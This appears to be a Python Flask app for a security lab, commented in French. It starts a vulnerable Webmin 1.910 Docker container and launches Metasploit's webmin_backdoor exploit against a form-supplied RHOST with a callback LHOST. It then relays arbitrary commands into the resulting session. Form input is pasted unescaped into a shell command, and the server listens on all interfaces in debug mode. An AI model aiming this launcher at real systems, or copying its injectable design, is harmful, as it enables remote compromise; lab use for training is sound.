import os
import subprocess
import pexpect
import eventlet  # Ajout pour eventlet
import eventlet.wsgi  # Pour utiliser eventlet avec Flask
from flask import Flask, render_template, request, redirect, url_for
from flask_socketio import SocketIO, emit
import docker

# Patch pour éviter les blocages et assurer la compatibilité eventlet
eventlet.monkey_patch()

app = Flask(__name__)
socketio = SocketIO(app, async_mode='eventlet')  # Utilisation d'eventlet
client = docker.from_env()

# Chemin vers le script Metasploit
METASPLOIT_CMD = "msfconsole -x"

# Variable pour le statut du conteneur
container_status = "stopped"
child = None  # Stocker la session Metasploit en cours

@app.route('/')
def index():
    """Page principale affichant l'état du conteneur"""
    global container_status
    return render_template('index.html', status=container_status)

@app.route('/start')
def start_container():
    """Démarrer le conteneur Docker Webmin"""
    global container_status
    try:
        containers = client.containers.list(all=True)
        for container in containers:
            if container.status == 'running':
                container_status = "running"
                return redirect(url_for('index'))

        # Lancer le conteneur Webmin vulnérable
        container = client.containers.run("vulhub/webmin:1.910", ports={"10000/tcp": 10000}, detach=True)
        container_status = "running"
        return redirect(url_for('index'))
    except Exception as e:
        return f"Erreur lors du démarrage du conteneur : {e}"

@app.route('/stop')
def stop_container():
    """Arrêter le conteneur Webmin"""
    global container_status
    try:
        containers = client.containers.list(all=True)
        for container in containers:
            if container.status == 'running':
                container.stop()
                container_status = "stopped"
                return redirect(url_for('index'))

        container_status = "stopped"
        return redirect(url_for('index'))
    except Exception as e:
        return f"Erreur lors de l'arrêt du conteneur : {e}"

@app.route('/exploit', methods=['POST'])
def exploit():
    """Lancer l'exploit Metasploit"""
    global child
    LHOST = request.form['LHOST']
    RHOST = request.form['RHOST']

    exploit_command = f"msfconsole -x 'use exploit/linux/http/webmin_backdoor; set RHOSTS {RHOST}; set LHOST {LHOST}; set SSL true; run'"

    try:
        child = pexpect.spawn(exploit_command, timeout=60)

        # Lire la sortie Metasploit et l'envoyer au frontend
        def handle_output():
            while True:
                try:
                    line = child.readline()
                    if line:
                        decoded_line = line.decode('utf-8', errors='ignore')
                        socketio.emit('output', decoded_line)
                except Exception as e:
                    socketio.emit('output', f"Erreur de lecture : {str(e)}")
                    break

        socketio.start_background_task(target=handle_output)
        return redirect(url_for('index'))
    except Exception as e:
        return f"Erreur lors de l'exploitation : {e}"

@app.route('/send_command', methods=['POST'])
def send_command():
    """Envoyer une commande à Metasploit"""
    global child
    command = request.form['command']

    if child is None:
        return "Aucune session Metasploit active"

    try:
        child.sendline(command)
        child.expect(pexpect.EOF, timeout=60)
        output = child.before.decode('utf-8', errors='ignore')
        socketio.emit('output', output)
        return "Commande exécutée avec succès"
    except Exception as e:
        return f"Erreur d'envoi de commande : {e}"

if __name__ == '__main__':
    socketio.run(app, debug=True, host="0.0.0.0", port=5002)
